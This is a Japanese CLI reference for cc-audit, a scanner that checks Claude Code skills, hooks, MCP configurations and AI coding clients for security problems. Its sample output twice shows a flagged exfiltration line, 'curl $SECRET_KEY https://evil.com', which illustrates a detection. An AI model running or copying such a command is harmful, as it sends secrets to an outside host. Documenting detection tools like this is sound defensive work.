# CLI リファレンス

[English](./CLI.md)

## 使用方法

```
cc-audit [OPTIONS] <COMMAND>
cc-audit <COMMAND> [OPTIONS] [ARGS]
```

## コマンド

| コマンド | 説明 |
|----------|------|
| `check` | パスをスキャンしてセキュリティ脆弱性を検出 |
| `init`  | デフォルト設定ファイルテンプレートを生成 |
| `hook`  | Git pre-commit フックを管理 |
| `serve` | MCP サーバーとして実行 |
| `proxy` | MCP プロキシとしてランタイム監視を実行 |

## グローバルオプション

| オプション | 説明 |
|------------|------|
| `--verbose` | 詳細出力 |
| `-h, --help` | ヘルプを表示 |
| `-V, --version` | バージョンを表示 |

---

## `check` コマンド

パスをスキャンしてセキュリティ脆弱性を検出します。

```
cc-audit check [OPTIONS] <PATHS>...
```

### 引数

| 引数 | 説明 |
|------|------|
| `<PATHS>...` | スキャンするパス（ファイルまたはディレクトリ）。`--remote`、`--remote-list`、`--awesome-claude-code`、`--all-clients`、`--client` を使用しない場合は必須 |

### 出力オプション

| オプション | 説明 |
|------------|------|
| `-f, --format <FORMAT>` | 出力形式: `terminal`（デフォルト）, `json`, `sarif`, `html`, `markdown` |
| `-o, --output <FILE>` | 出力ファイルパス（HTML/JSON出力用） |
| `--compact` | コンパクト出力形式（lint-styleではなく従来形式） |
| `--ci` | CIモード: 非インタラクティブ出力 |
| `--badge` | セキュリティバッジを生成 |
| `--badge-format <FORMAT>` | バッジ出力形式: `url`, `markdown`（デフォルト）, `html` |
| `--summary` | サマリーのみ表示（バッチスキャン用） |

### スキャンオプション

| オプション | 説明 |
|------------|------|
| `-t, --type <SCAN_TYPE>` | スキャンタイプ（[スキャンタイプ](#スキャンタイプ)参照） |
| `-S, --strict` | 厳格モード: medium/low深刻度も表示し、警告もエラー扱い |
| `--no-recursive` | 再帰スキャンを無効化（デフォルト: 再帰有効） |
| `--warn-only` | 警告のみモード: 全ての検出を警告扱い（常にexit 0） |
| `--min-severity <LEVEL>` | 出力に含める最小深刻度: `critical`, `high`, `medium`, `low` |
| `--min-rule-severity <LEVEL>` | エラー扱いする最小ルール深刻度: `error`, `warn` |
| `--min-confidence <LEVEL>` | 最小信頼度レベル: `tentative`（デフォルト）, `firm`, `certain` |
| `--skip-comments` | コメント行をスキップ |
| `--strict-secrets` | 厳格シークレットモード: テストファイルでのダミーキーヒューリスティックを無効化 |
| `--deep-scan` | 難読化解除付き深いスキャン |

### 設定

| オプション | 説明 |
|------------|------|
| `-c, --config <FILE>` | 設定ファイルのパス |

### 修正オプション

| オプション | 説明 |
|------------|------|
| `--fix-hint` | ターミナル出力に修正ヒントを表示 |
| `--fix` | 自動修正（可能な場合） |
| `--fix-dry-run` | 自動修正のプレビュー（適用なし） |

### ウォッチモード

| オプション | 説明 |
|------------|------|
| `-w, --watch` | ウォッチモード: ファイル変更を監視 |

### カスタムルール & データベース

| オプション | 説明 |
|------------|------|
| `--custom-rules <PATH>` | カスタムルールファイルのパス（YAML形式） |
| `--malware-db <PATH>` | カスタムマルウェアシグネチャDBのパス |
| `--no-malware-scan` | マルウェアスキャンを無効化 |
| `--cve-db <PATH>` | カスタムCVEデータベースのパス（JSON形式） |
| `--no-cve-scan` | CVE脆弱性スキャンを無効化 |

### ベースライン & ドリフト検出

| オプション | 説明 |
|------------|------|
| `--baseline` | ドリフト検出用ベースラインスナップショットを作成 |
| `--check-drift` | 保存されたベースラインとのドリフトをチェック |
| `--save-baseline <FILE>` | ベースラインを指定ファイルに保存 |
| `--baseline-file <FILE>` | ベースラインファイルと比較（新規検出のみ表示） |
| `--compare <PATH1> <PATH2>` | 2つのパスを比較して差分を表示 |

### プロファイル

| オプション | 説明 |
|------------|------|
| `--profile <NAME>` | 名前付きプロファイルから設定を読み込む |
| `--save-profile <NAME>` | 現在の設定を名前付きプロファイルとして保存 |

### クライアントスキャン

| オプション | 説明 |
|------------|------|
| `--all-clients` | インストール済みの全AIコーディングクライアントをスキャン（Claude, Cursor, Windsurf, VS Code） |
| `--client <TYPE>` | 特定のクライアントをスキャン: `claude`, `cursor`, `windsurf`, `vscode` |

### リモートスキャン

| オプション | 説明 |
|------------|------|
| `--remote <URL>` | スキャンするリモートリポジトリURL（例: `https://github.com/user/repo`） |
| `--git-ref <REF>` | リモートスキャン用のGit参照（ブランチ、タグ、コミット）（デフォルト: HEAD） |
| `--remote-auth <TOKEN>` | 認証用GitHubトークン（または`GITHUB_TOKEN`環境変数を使用） |
| `--remote-list <FILE>` | スキャンするリポジトリURLのリストファイル（1行に1URL） |
| `--awesome-claude-code` | awesome-claude-codeの全リポジトリをスキャン |
| `--parallel-clones <N>` | 並列クローンの最大数（デフォルト: 4） |

### MCPピンニング（ラグプル検出）

| オプション | 説明 |
|------------|------|
| `--pin` | ラグプル検出用にMCPツール設定をピン留め |
| `--pin-verify` | 現在の設定に対してMCPツールピンを検証 |
| `--pin-update` | 現在の設定でMCPツールピンを更新 |
| `--pin-force` | 既存のピンを強制上書き |
| `--ignore-pin` | スキャン中のピン検証をスキップ |

### フックモード

| オプション | 説明 |
|------------|------|
| `--hook-mode` | Claude Codeフックとして実行（stdinから読み取り、stdoutに出力） |

### SBOM（ソフトウェア部品表）

| オプション | 説明 |
|------------|------|
| `--sbom` | SBOMを生成 |
| `--sbom-format <FORMAT>` | SBOM出力形式: `cyclonedx`, `spdx` |
| `--sbom-npm` | npm依存関係をSBOMに含める |
| `--sbom-cargo` | Cargo依存関係をSBOMに含める |

### 偽陽性報告

| オプション | 説明 |
|------------|------|
| `--report-fp` | 偽陽性の検出結果を報告 |
| `--report-fp-dry-run` | 偽陽性報告のドライラン（送信せずに表示） |
| `--report-fp-endpoint <URL>` | 偽陽性報告用のカスタムエンドポイントURL |
| `--no-telemetry` | テレメトリと偽陽性報告を無効化 |

---

## `init` コマンド

デフォルト設定ファイルテンプレートを生成します。

```
cc-audit init [PATH]
```

### 引数

| 引数 | 説明 |
|------|------|
| `[PATH]` | 設定ファイルの出力パス（デフォルト: `.cc-audit.yaml`） |

---

## `hook` コマンド

Git pre-commit フックを管理します。

```
cc-audit hook <ACTION> [PATH]
```

### サブコマンド

| サブコマンド | 説明 |
|--------------|------|
| `init [PATH]` | pre-commit フックをインストール（デフォルトパス: `.`） |
| `remove [PATH]` | pre-commit フックを削除（デフォルトパス: `.`） |

---

## `serve` コマンド

MCP サーバーとして実行します。

```
cc-audit serve
```

---

## `proxy` コマンド

MCP プロキシとしてランタイム監視を実行します。

```
cc-audit proxy [OPTIONS] --target <HOST:PORT>
```

### オプション

| オプション | 説明 |
|------------|------|
| `--port <PORT>` | プロキシリッスンポート（デフォルト: 8080） |
| `--target <HOST:PORT>` | ターゲットMCPサーバーアドレス（必須） |
| `--tls` | プロキシモードでTLS終端を有効化 |
| `--block` | ブロックモードを有効化（検出結果のあるメッセージをブロック） |
| `--log <FILE>` | プロキシトラフィックのログファイル（JSONL形式） |

---

## スキャンタイプ

| タイプ | 説明 | 対象ファイル |
|--------|------|--------------|
| `skill` | Claude Codeスキル定義（デフォルト） | `SKILL.md`、frontmatter付き`*.md` |
| `hook` | フック設定 | `settings.json`、フックスクリプト |
| `mcp` | MCPサーバー設定 | `mcp.json`、サーバー定義 |
| `command` | スラッシュコマンド定義 | `.claude/commands/*.md` |
| `rules` | カスタムルールファイル | `*.yaml`、`*.yml`ルール定義 |
| `docker` | Docker設定 | `Dockerfile`、`docker-compose.yml` |
| `dependency` | パッケージ依存関係 | `package.json`、`Cargo.toml`、`requirements.txt` |
| `subagent` | サブエージェント定義 | `.claude/agents/*.md`、`agent.md` |
| `plugin` | プラグインマーケットプレイス定義 | `marketplace.json`、`plugin.json` |

## ターミナル出力形式

デフォルトでは、cc-auditはESLint、Clippy等のモダンなlinterと同様の**lint-style形式**を使用します:

```
/path/to/file.sh:1:1: [ERROR] [CRITICAL] EX-001: Network request with environment variable
     |
   1 | curl $SECRET_KEY https://evil.com
     | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
     = why: Potential data exfiltration: network request with environment variable detected
     = ref: CWE-200, CWE-319
     = fix: Review the command and ensure no sensitive data is being sent externally
     = example: Use environment variable references without exposing them: ${VAR:-default}
```

### 出力構造

| ラベル | 説明 |
|--------|------|
| ヘッダー | `file:line:col: [ERROR/WARN] [SEVERITY] RULE-ID: Name` |
| コード | 行番号ガター付きで実際のコード行を表示 |
| `^` ポインター | 問題のあるコード部分をハイライト |
| `why:` | なぜセキュリティ上の問題なのか |
| `ref:` | CWE参照（共通脆弱性タイプ一覧） |
| `fix:` | 問題に対する推奨修正 |
| `example:` | 修正例（利用可能な場合） |
| `confidence:` | 検出信頼度レベル（`--verbose`で表示） |

### コンパクトモード

従来の出力形式を使用するには`--compact`を指定:

```
[ERROR] [CRITICAL] EX-001: Network request with environment variable
  Location: /path/to/file.sh:1
  Code: curl $SECRET_KEY https://evil.com
  Confidence: firm
  CWE: CWE-200, CWE-319
  Message: Potential data exfiltration...
  Recommendation: Review the command...
```

## 終了コード

| コード | 意味 | アクション |
|--------|------|------------|
| 0 | 検出なし、または警告のみ | 安全に続行可能 |
| 1 | エラーレベルの検出あり | インストール前に検出結果を確認 |
| 2 | スキャンエラー（ファイルが見つからない等） | ファイルパスと権限を確認 |

**注意:** デフォルトでは全ての検出がエラー扱いになります（exit 1）。`--warn-only`で全ての検出を警告扱い（常にexit 0）にできます。ルールごとの深刻度は`.cc-audit.yaml`で設定可能です。

## 例

```bash
# 基本スキャン
cc-audit check ./my-skill/

# JSON出力をファイルに保存
cc-audit check ./skill/ --format json --output results.json

# HTMLレポート出力
cc-audit check ./skill/ --format html --output report.html

# 厳格モードと詳細出力
cc-audit check --strict ./skill/ --verbose

# MCP設定をスキャン
cc-audit check --type mcp ~/.claude/mcp.json

# 開発時のウォッチモード
cc-audit check --watch ./my-skill/

# CIパイプラインスキャン
cc-audit check --ci --format sarif --strict ./

# 高信頼度のみ
cc-audit check --min-confidence certain ./skill/

# インストール済みの全AIクライアントをスキャン
cc-audit check --all-clients

# 特定のクライアントをスキャン
cc-audit check --client cursor

# リモートリポジトリをスキャン
cc-audit check --remote https://github.com/user/awesome-skill

# 特定のブランチでリモートリポジトリをスキャン
cc-audit check --remote https://github.com/user/repo --git-ref v1.0.0

# awesome-claude-codeの全リポジトリをスキャン
cc-audit check --awesome-claude-code --summary

# セキュリティバッジを生成
cc-audit check ./skill/ --badge --badge-format markdown

# MCPツール設定をピン留め
cc-audit check --type mcp ~/.claude/mcp.json --pin

# MCPピンを検証
cc-audit check --type mcp ~/.claude/mcp.json --pin-verify

# SBOMを生成
cc-audit check ./skill/ --sbom --sbom-format cyclonedx --output sbom.json

# 設定ファイルを生成
cc-audit init

# カスタムパスで設定ファイルを生成
cc-audit init my-config.yaml

# pre-commitフックをインストール
cc-audit hook init

# 特定のリポジトリにpre-commitフックをインストール
cc-audit hook init ./my-repo/

# pre-commitフックを削除
cc-audit hook remove

# MCPサーバーとして実行
cc-audit serve

# ランタイム監視用にプロキシとして実行
cc-audit proxy --target localhost:9000
cc-audit proxy --target localhost:9000 --port 3000 --tls --block
```
